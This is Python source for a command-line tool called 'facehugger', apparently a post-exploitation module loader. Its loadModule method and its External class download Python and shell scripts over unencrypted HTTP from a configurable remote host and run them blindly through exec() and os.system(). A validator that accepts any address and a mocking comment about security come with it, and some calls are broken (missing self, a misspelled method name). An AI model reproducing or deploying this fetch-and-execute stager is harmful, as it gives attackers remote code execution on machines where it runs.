# Libraries
# ---------
import subprocess
import os
import requests
from bs4 import BeautifulSoup
from termcolor import colored
import re, sys
import signal
import socket

class Terminal:
    """ Provides methods that provide command line functionality to let the user 
    load and run additional modules and provides the interface to let them interface
    with those modules """
    def __init__(self, remote_host = None, motd=True):
        self.remote_host = remote_host
        self.default_modules = [] # add default modules to be loaded here
        self.loaded_modules = {}
        for module in self.default_modules:
            loadModule(module)
        self.current_module = None
        self.motd = motd
        self.showMotd()
    
    def showMotd(self):
        """ print motd banner """
        buff='    ______                __                               \n'
        buff+='   / ____/___ _________  / /_  __  ______ _____ ____  _____\n'
        buff+='  / /_  / __ `/ ___/ _ \\/ __ \\/ / / / __ `/ __ `/ _ \\/ ___/\n'
        buff+=' / __/ / /_/ / /__/  __/ / / / /_/ / /_/ / /_/ /  __/ /    \n'
        buff+='/_/    \\__,_/\\___/\\___/_/ /_/\\__,_/\\__, /\\__, /\\___/_/     \n'
        buff+='                                  /____//____/             \n'
        print(buff,'\n')
        buff='                                   .---._\n'
        buff+='                                  /==----\\_\n'
        buff+='                 |\\              |8=---()-\\|   |\\\n'
        buff+='         /|      ::\\             |8=-/|\\(_)>_   \\\\\n'
        buff+='         |:\\     `::\\_            \\=/:\\= (_)\\|   |\\\n'
        buff+='         `::|     |::::.            \\;:\\=\\(_)>_  |\\\\\n'
        buff+='          |b\\\\_,_ \\`::::\\             \\:\\=\\( \\/  \\_(\n'
        buff+="          `\\88b`\\|/|'`:::\\   .-----   :8:\\=|`=>_  [d[\n"
        buff+='           \\;\\88b.\\=|///::`-/::;;;;:\\ |8;|=\\( )/   [8[\n'
        buff+="      __    ||/`888b.\\_\\/\\:/:;/'/-\\::\\/( \\|=(=)>_  [d|\n"
        buff+='     //):.. `::|/|\\"96.\\|//;/|\'| /-\\::+\\|-\\=(. )/  [8[\n'
        buff+='    |(/88e::.. `\'.|| "min;/\\\\/8|\\.-|::|8|||=|`=\'_  `[d|\n'
        buff+='     `-|8888ee::,,,`\\/88utes8P//8|-|::|8||\\=|( )/   ]8[\n'
        buff+='      |:`"|####b:::/8pq8e/::\'`;q8|/::dP\'|\\|=|`=\'_   [d|\n'
        buff+=' .=-. \\::..`""##Gst:q| e|:/..\\:|8|.:/|\'/\\/|/|(_)/   ]8[\n'
        buff+="/(,:;:, \\::::.\\#/88q;`;'\\||.:/-//.;/<8\\\\\\^\\||./>    `]d[\n"
        buff+='`8888b::,,_ ::/88q;.`;|d8/`-.]/|./  |8|\\|:|;/.d|     [8|\n'
        buff+='  `"88###n::-/d8P.\\e/-|d/ _//;;|/   |8(|::(/).8/     ]d[\n'
        buff+='    `"###o2:1dP;`q./=/d/_//|8888\\   ;8|^\\/`-\'8/      [8\\\n'
        buff+='       `"v7|9q8e;./=/d//=/\\|eeeb|  /dP= =<ee8/       ]d-\n'
        buff+="          \\|9; qe/-d/ .|/=/888|:\\ `--=- =88p'        [8[\n"
        buff+='          (d5b;,/ d/.|/=-\\Oo88|:/                   ,8_\\\n'
        buff+="         _|\\q88| d/ /'=q8|888/:/                    ]d|\n"
        buff+='        _\\\\\\/q8/|8\\_""/////eb|/_                    [8_\\\n'
        buff+='        \\|\\\\<==_(;d888b,.////////--._               ]8|\n'
        buff+='       _/\\\\\\/888p |=""";;;;`eee.////.;-._          ,8p\\\n'
        buff+='      /,\\\\\\/88p\\ /==/8/.\'88`""""88888eeee`.        ]8|\n'
        buff+='    .d||8,\\/p   /-dp_d8|:8:.d\\=\\    `""""|=\\\\     .[8_\\\n'
        buff+="    |8||8||8.-/'d88/8p/|:8:|8b\\=\\        /|\\\\|    ]8p|\n"
        buff+="    |8||8||8b''d.='8p//|:8:'`88b`\\       |||||)   [8'\\\n"
        buff+="    `8b:qb.\\888:e8P/'/P'8:|:8:`888|      |'\\||'  /8p|\n"
        buff+="     q8q\\\\qe---_P;'.'P|:8:|:8:|`q/\\\\     '_///  /8p_\\\n"
        buff+="     _|88b-:==:-d6/P' |8::'|8:| ,|\\||    '-=' .d8p/\n"
        buff+="    |__8Pdb-q888P-'  .:8:| |8:| |/\\||\\     .-e8p/\\|\n"
        buff+="     .-\\888b.__      |:8/' |8:| \\ _|;|,-eee8\\8\\|\n"
        buff+="     \\.-\\'88/88/e.e.e|8/|\\_--.-.-e8|8|88\\8p\\|\n"
        buff+="       .'`-;88]88|8|/':|:\\ `q|8|8|8'-\\| \\|\n"
        buff+="        `' || || |_/(/|;\\)`-\\\\`--,\\|\n"
        buff+='              `\' /v"""\' `""""""vVV\\\n'
        print(buff)
    
    def commandLine(self):
        """ Show the command line and take input """
        while True:
            if self.current_module != None:
                cmd = input(f'facehugger~{self.current_module.name}# ')
            else:
                cmd = input(f'facehugger~# ')
            self.runCommand(cmd)

    def runCommand(self, cmd):
        """ Parses command and performs the specified action or prints error if malformed"""
        cmd = cmd.strip().split(' ')
        if cmd[0] == '':
            return
        if cmd[0] == "help":
            # Display help
            self.help()
        elif cmd[0] == "motd":
            # Print banner
            self.showMotd()
        elif cmd[0] == "quit":
            # Exit to command line
            self.quit()
        elif cmd[0] == "load" and 1 < len(cmd) <= 3:
            # Load a module form the remote host
            if len(cmd) == 2:
                self.loadModule(cmd[1])
            else:
                self.loadModule(cmd[1],cmd[2])
        elif len(cmd) == 3 and cmd[0] == "set" and cmd[1] == "remote":
            # Set the remote host
            self.setRemoteHost(cmd[2])
        elif len(cmd) == 3 and cmd[0] == "set" and cmd[1] == "module":
            # Set the current module
            self.setModule(cmd[2])
        elif len(cmd) == 4 and cmd[0] == "set" and cmd[1] == "attr": 
            #  set the specified module attribute
            self.setModuleAttribute(cmd[2],cmd[3])
        elif cmd[0] == "run":
            # Run the module
            self.runModule()
        elif cmd[0] == "extern" and 1 < len(cmd) <= 4:
            if len(cmd) == 2:
                self.runExternal(cmd[1])
            elif len(cmd) == 3:
                self.runExteranl(cmd[1], cmd[2])
            else:
                self.runExternal(cmd[1],cmd[2],cmd[3])
        elif cmd[0] == 'usage':
            # Print usage information for current module
            if self.current_module != None:
                self.current_module.usage()
            else:
                print('[!] No module currently active')
        elif cmd[0] == 'list' and cmd[1] == 'attr':
            self.current_module.listAttributes()
        else:
            print('[!] Not a valid command! Type "help" for a list of commands')

    def help(self):
        """ Print help information """
        print("----------Commands----------")
        print("load [module-name] <remote host>- Downloads a module from the remote host and makes it available to be used")
        print("set module [module-name] - Makes the specified module active")
        print("set remote [host ip address] - Sets the ip address of the default remote host to download resources from")
        print("set attr [attribute-name] [attribute-value] - Sets an attribute of the current module a specified value")
        print("run - Executes the primary function of the module")
        print("extern [filename] <remote-host>")
        print("list attr - Displays a list of the active modules attributes and their current values")
        print("usage - prints a help message detailing the usage information for the active module")
        print("help - Prints this very message to the console")
        print("motd - Displays the message of the day banner")
        print("quit - Exits the program")
    
    def loadModule(self, module, host=None):
        """ Connects back to the remote host and attempts to download and import the specified module"""
        if not host:
            host = self.remote_host
        print(f'[*] Loading module {module} from {host}')
        raw = None
        try:
            raw = requests.get("http://"+host+"/modules/"+module+".py")
        except requests.exceptions.ConnectionError:
            print(f"[!] Error! Failed to connect to remote host at {host}")
            return
        if raw.status_code == 200:
            exec(raw.text) # wow, such security, amazing, hacker proof, wow
        else:
            print(f'[!] Error! Module {module} not found!')
            return False

    def isValidIpAddr(self, addr):
        """ Check using a regex that the supplied string is a valid ip address """
        return True

    def setRemoteHost(self, host):
        """ Changes the default remote_host to load modules from """
        if isValidIpAddr(host):
            self.remote_host = host
        else:
            print("[!] The supplied ip address is invalid. ")

    def setModule(self, module):
        """ Instantiate the given module and set to be the current_module """
        if module in self.loaded_modules:
            self.current_module = self.loaded_modules[module]
            print(f'[*] Set active module to {module} ')
        else:
            print(f'[!] Module {module} has not been loaded, could not make active ')

    def setModuleAttribute(self, attr, val):
        """ Set a field of the current module instance to the supplied value """
        if self.current_module.setAttribute(attr, val):
            print(f'[*] Set attribute {attr} to {val}')
        else:
            print(f'[!] Invalid attribute or value')

    def runModule(self):
        """ Execute the modules main loop and provide output detailing success or failure """
        print(f'Running module {self.current_module.name}')
        result = self.current_module.run()
        if result:
            print("[*] Module ran successfully ")
        else:
            print("[!] Module failed ")

    def quit(self):
        """ Exit the program and return to the shell """
        #print()
        #print("")
        exit(0)

    def runExternal(self, resource, host=None, foreground=True):
        """ Create an instance of external class to handle script, create a new thread 
            to do so if fg set (not done)"""
        if not host:
            host = self.remote_host
        print("[*] Loading external script from http://"+host+"/"+resource)
        session = External(resource, host, foreground)
        result = session.begin()
        if result:
            print("[*] Script ran successfully")
        else:
            print("[!] Script failed ")

class External:
    def __init__(self, resource, host, foreground):
        self.fg = foreground
        self.host = host
        self.resource = resource 

    def runPython(self, raw):
        exec(raw)
        return True

    def runBash(self, raw):
        os.system(raw)
        return True

    def begin(self):
        print("[*] Downloading script from http://"+self.host+"/"+self.resource)
        raw = requests.get("http://"+self.host+"/"+self.resource).text
        ext = self.resource.split('.')[-1]
        if ext == 'py':
            return self.runPython(raw)
        elif ext == 'sh':
            return self.runBash(raw)
        else:
            print("[!] File type not supported. Please select a python or bash file")
            return False

class BaseModule:
    def __init__(self):
        self.attr = {}
    
    def listAttributes(self):
        for key in self.attr:
            print(f'{key} -> {self.attr[key]}')

    def usage(self):
        raise NotImplementedError

    def validate(self, attr, val):
        """ Abstract method for validating change of attribute, all children must overwrite"""
        raise NotImplementedError

    def setAttribute(self, attr, val):
        """ Set the specified attribute to the given value """
        if self.validate(attr, val):
            self.attr[attr] = val
            return True
        else:
            return False

    def run(self):
        """ Abstract run method, all children must overwrite """
        raise NotImplementedError

if __name__ == "__main__":
    signal.signal(signal.SIGINT, lambda signum, stack : exit(1))
    term = Terminal("127.0.0.1")
    term.commandLine()
